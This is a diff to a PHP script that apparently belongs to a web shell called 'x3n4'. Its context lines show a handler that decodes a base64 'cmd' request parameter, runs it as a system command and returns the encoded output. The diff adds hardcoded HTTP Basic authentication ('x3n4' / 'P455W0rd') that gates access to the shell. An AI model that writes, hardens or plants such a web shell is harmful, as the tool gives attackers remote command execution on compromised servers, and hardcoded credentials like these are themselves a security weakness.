@@ -1,4 +1,8 @@
 <?php
+$user = 'x3n4'; 
+$password = 'P455W0rd';
+
+require_auth($user, $password);
 
 define('X3N4_VERSION', 'v0.1.5-alpha');
 
@@ -128,6 +132,22 @@ if (isset($_REQUEST['cmd'])) {
 
     $output = execute_command(base64_decode($_REQUEST['cmd']) . ' 2>&1');
     output_json(base64_encode($output));
+}
+function require_auth($user, $password) {
+	$AUTH_USER = $user;
+	$AUTH_PASS = $password;
+	header('Cache-Control: no-cache, must-revalidate, max-age=0');
+	$has_supplied_credentials = !(empty($_SERVER['PHP_AUTH_USER']) && empty($_SERVER['PHP_AUTH_PW']));
+	$is_not_authenticated = (
+		!$has_supplied_credentials ||
+		$_SERVER['PHP_AUTH_USER'] != $AUTH_USER ||
+		$_SERVER['PHP_AUTH_PW']   != $AUTH_PASS
+	);
+	if ($is_not_authenticated) {
+		header('HTTP/1.1 401 Authorization Required');
+		header('WWW-Authenticate: Basic realm="Access denied"');
+		exit;
+	}
 }
 
 /**
